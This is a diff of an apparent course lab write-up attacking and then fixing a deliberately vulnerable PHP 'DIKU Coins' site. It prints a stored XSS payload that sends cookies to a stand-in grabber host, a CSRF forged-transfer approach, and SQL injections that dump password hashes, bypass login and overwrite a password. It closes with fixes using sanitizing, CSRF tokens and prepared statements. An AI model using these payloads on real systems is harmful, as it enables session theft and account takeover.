@@ -7,28 +7,28 @@ Part 1: Black Box Assessment
 
 ## Attack A. Cookie Theft
 
-The cookie theft is done by writing up in the message input the following line message:
+The cookie theft can occur when writing in the message input the following line message:
 
-	`Any message we want</p>
-	<SCRIPT type="text/javascript">
-		var image = document.createElement("img");
-		image.src = "http://www.cookiegrabber.com/evil.php?cookie=" + escape(document.cookie);
-	</SCRIPT>
-	<p>`
+    `Any message we want</p>
+    <SCRIPT type="text/javascript">
+        var image = document.createElement("img");
+        image.src = "http://www.cookiegrabber.com/evil.php?cookie=" + escape(document.cookie);
+    </SCRIPT>
+    <p>`
 
-Because the form inputs are not sanitised or checked in any way by the server we can save the message in the databese like it is. If in a Second-Order SQL Injection the data stored in database is later used to conduct SQL injection, In this case we might say that this is a Second-Order cookie hijacking because we get the session token when the user clicks on our message and renders the HTML page with our script. The image will create a GET request to our evil webservice. Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack.
+Because the form inputs are not sanitised or checked in any way by the server we can save the message in the database like it is. If in a Second-Order SQL Injection the data stored in the database is later used to conduct SQL injection, In this case, we might say that this is a Second-Order cookie hijacking because we get the session token when the user clicks on our message and renders the HTML page with our script. The image will create a GET request to our evil web service. Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack.
 
 ## Attack B. Cross-Site Request Forgery
 
 In the transfer page we have this form for transfering coins:
 
-	`<form method="POST" name="transferform" action="/transfer.php">
-		<p>Send <input name="coins" value="" size="10" type="text"> DIKU Coins</p>
-		<p>to <input name="recipient" value="" type="text"></p>
-		<input name="submission" value="Send" type="submit">
-	</form>`
+    `<form method="POST" name="transferform" action="/transfer.php">
+        <p>Send <input name="coins" value="" size="10" type="text"> DIKU Coins</p>
+        <p>to <input name="recipient" value="" type="text"></p>
+        <input name="submission" value="Send" type="submit">
+    </form>`
 
-We will need to modify this form and place it into our malicious webpage. The solution for type of attack can be found in the `malicious.html` docoument. We will add `you` to the value of the `recepient` input to transfer the coins from the logged in user. This form will reside in a hidden iframe and after we submit the form with a simple Javascript function we change the location of out webpage to `http://yesimparanoid.com`.
+We will need to modify this form and place it into our malicious web page. The solution for th type of attack can be found in the `malicious.html` document. We will add `you` to the value of the `recipient` input to transfer the coins from the logged in user. This form will reside in a hidden iframe and after we submit the form with a simple Javascript function we change the location of out web page to `http://yesimparanoid.com`.
 
 Part 2: White Box Assessment
 ----------------------------
@@ -37,77 +37,77 @@ Part 2: White Box Assessment
 
 We will use some simple SQL injection to get what we want. This is done by inputting the following command in the `users.php` search field:
 
-	'
-	UNION ALL
-	SELECT
-		GROUP_CONCAT(Username, '|', DikuCoins, '|', Password, '|', Salt SEPARATOR '<br>') AS Profile,
-		NULL as Username,
-		NULL as DikuCoins
-	FROM Person
-	WHERE '1'='1
+    '
+    UNION ALL
+    SELECT
+        GROUP_CONCAT(Username, '|', DikuCoins, '|', Password, '|', Salt SEPARATOR '<br>') AS Profile,
+        NULL as Username,
+        NULL as DikuCoins
+    FROM Person
+    WHERE '1'='1
 
 Because the SQL statement is written in plain text like so:
 
-	```php
-	$selecteduser = $_GET['user'];
-	$sql = "SELECT Profile, Username, DikuCoins FROM Person " .
+    ```php
+    $selecteduser = $_GET['user'];
+    $sql = "SELECT Profile, Username, DikuCoins FROM Person " .
      "WHERE Username='$selecteduser'";
-	```
+    ```
 
 This will create the following SQL statement:
 
-	SELECT Profile, Username, DikuCoins FROM Person 
-	WHERE Username=''
-	UNION ALL
-	SELECT
-		GROUP_CONCAT(Username, '|', DikuCoins, '|', Password, '|', Salt SEPARATOR '<br>') AS Profile,
-		NULL as Username,
-		NULL as DikuCoins
-	FROM Person
-	WHERE '1'='1'
+    SELECT Profile, Username, DikuCoins FROM Person 
+    WHERE Username=''
+    UNION ALL
+    SELECT
+        GROUP_CONCAT(Username, '|', DikuCoins, '|', Password, '|', Salt SEPARATOR '<br>') AS Profile,
+        NULL as Username,
+        NULL as DikuCoins
+    FROM Person
+    WHERE '1'='1'
 
 
-This will retreive everything we want to know about the users currently in the database. Unfortunately the passwords are hashed but we do have the hashes and salts available to us.
+This will retrieve everything we want to know about the users currently in the database. Unfortunately, the passwords are hashed but we do have the hashes and salts available to us.
 
 
 ## Change password of br0ns
 
 In the `auth.php` file the login is checked by building the function `_checkLogin` with the following plain text SQL query:
-	
-	$sql = "SELECT * FROM Person WHERE " .
+    
+    $sql = "SELECT * FROM Person WHERE " .
            "Username = '$username' AND " .
            "Password = '$hashedpassword'";
 
-We can use here an SQL injection to login as br0ns, like so:
+We can use here an SQL injection to log in as br0ns, like so:
 
-	In the username field:
-		br0ns' OR '1'='1
-	In the password field: 
-		(anything we want)
+    In the username field:
+        br0ns' OR '1'='1
+    In the password field: 
+        (anything we want)
 
 This will create the following SQL statement:
 
-	$sql = "SELECT * FROM Person WHERE " .
-			"Username = 'br0ns' OR '1'='1' AND " .
-			"Password = '(anything we want)'";
+    $sql = "SELECT * FROM Person WHERE " .
+            "Username = 'br0ns' OR '1'='1' AND " .
+            "Password = '(anything we want)'";
 
-The following command will successed because the AND binds stronger than OR. It will find the $username and will not check if the passsword is correct.
-Another thing to point out is that the stored password in the database is hashed by an applying an md5sum on the password concatenated with a salt:
+The following command will succeed because the AND binds stronger than OR. It will find the $username and will not check if the password is correct.
+Another thing to point out is that the stored password in the database is hashed by an applying a md5sum on the password concatenated with a salt:
 
-	$hashedpassword = md5($password.$salt);
+    $hashedpassword = md5($password.$salt);
 
 So in order to change the password we must think of a password and salt combination and hash it in the terminal like so:
 
-	echo -n "(password)(salt)" | md5sum
+    echo -n "(password)(salt)" | md5sum
 
-The `-n` option is there so we don't include the newline character in our md5sum. After we retrieve our hashed password we have to save it in the database, along with the salt. The only way I found out how to save something to the profile is by updating our profile bio in `index.php`. Here we can see that the profile update is done by accessing a _POST variable directly in a SQL statement.
+The `-n` option is there so we don't include the newline character in our md5sum. After we retrieve our hashed password we have to save it in the database, along with the salt. The only way I found out how to save something to the profile is by updating our profile bio in `index.php`. Here we can see that the profile update is done by accessing a _POST variable directly in an SQL statement.
 
-	$sql = "UPDATE Person SET Profile='$profile' ".
+    $sql = "UPDATE Person SET Profile='$profile' ".
            "WHERE PersonID=$user->id";
 
 We use the $profile variable to inject our SQL command like so: (BTW the password is `hello`)
-	
-	$sql = "UPDATE Person SET Profile='So bad', Password='78ce5a134ac019f1f453f1c501677376', Salt='here' ".
+    
+    $sql = "UPDATE Person SET Profile='So bad', Password='78ce5a134ac019f1f453f1c501677376', Salt='here' ".
            "WHERE PersonID=$user->id";
 
 
@@ -117,32 +117,31 @@ Part 3: Fix It
 ## Fixing attack A
 
 We can fix this type of attack by sanitizing all the field inputs (`use`, `message` and `headline`) and removing any special characters with the `filter_var` PHP function like so:
-	$user = filter_var($_POST["user"], FILTER_SANITIZE_STRING); 
-	$headline = filter_var($_POST["headline"], FILTER_SANITIZE_STRING); 
-	$message = filter_var($_POST["message"], FILTER_SANITIZE_STRING); 
+    $user = filter_var($_POST["user"], FILTER_SANITIZE_STRING); 
+    $headline = filter_var($_POST["headline"], FILTER_SANITIZE_STRING); 
+    $message = filter_var($_POST["message"], FILTER_SANITIZE_STRING); 
 
-Of course we can have further protection by using prepared statements and not the direct SQL statement.
+Of course, we can have further protection by using prepared statements and not the direct SQL statement.
  
 ## Fixing attack B
 
-Because the user is logged in, the malicious webpage is using the authnticated user's token to submit a transfer request on his behalf. My solution would be to generate some sort of token everytime the user enters the `transfer.php` page and save the token in the database. While presenting the transfer form we would have a hidden input filed of the following:
-	
-	<input type=hidden name=secret value="<?php echo $secret_token ?>"> 
+Because the user is logged in, the malicious webpage is using the authenticated user's token to submit a transfer request on his behalf. My solution would be to generate some sort of token every time the user enters the `transfer.php` page and save the token in the database. While presenting the transfer form we would have a hidden input filed of the following:
+    
+    <input type=hidden name=secret value="<?php echo $secret_token ?>"> 
 
-After the user submits the form we check that the `secret` has the same value as the one in the database. By using this method, the malicious webpage cannot forge the token because the secret token is only generated by our "genuine" webservice. Also the token changes at every access of the `transfer.php` script and is randomly generated, ensuring that only our endpoint is trusted. I did alter the mysql database in order for this to work. We create a `transfer` table in the data base where we assing a secret_token to the user id each time the logged in user accesses the `transfer.php` page.
+After the user submits the form we check that the `secret` has the same value as the one in the database. By using this method, the malicious webpage cannot forge the token because the secret token is only generated by our "genuine" web service. Also the token changes at every access of the `transfer.php` script and is randomly generated, ensuring that only our endpoint is trusted. I did alter the MySQL database in order for this to work. We create a `transfer` table in the data base where we assign a secret_token to the user id each time the logged in user accesses the `transfer.php` page.
 
 
 ## Fixing SQL injection
 
 For this assignment I will fix the `users.php` SQL injection. To fix this issue I replaced the plain strng SQL statements with prepared statements:
 
-	$query = mysqli_prepare($db, "SELECT Profile, Username, DikuCoins FROM Person WHERE Username = ?");
-		mysqli_stmt_bind_param($query, 's', $selecteduser);
-		mysqli_stmt_execute($query);
-		mysqli_stmt_bind_result($query, $profile, $username, $coins);
-		mysqli_stmt_fetch($query);
-		if ( $username != '' ) {
-			$coins = intval($coins); 
+    $query = mysqli_prepare($db, "SELECT Profile, Username, DikuCoins FROM Person WHERE Username = ?");
+        mysqli_stmt_bind_param($query, 's', $selecteduser);
+        mysqli_stmt_execute($query);
+        mysqli_stmt_bind_result($query, $profile, $username, $coins);
+        mysqli_stmt_fetch($query);
+        if ( $username != '' ) {
+            $coins = intval($coins); 
 
-The complete code can be seen in the `users_fix.php` file.
-
+The complete code can be seen in the `users_fix.php` file. When the logged in user tries to list the same list of users he will be presented the 'Cannot find that user' error message. 
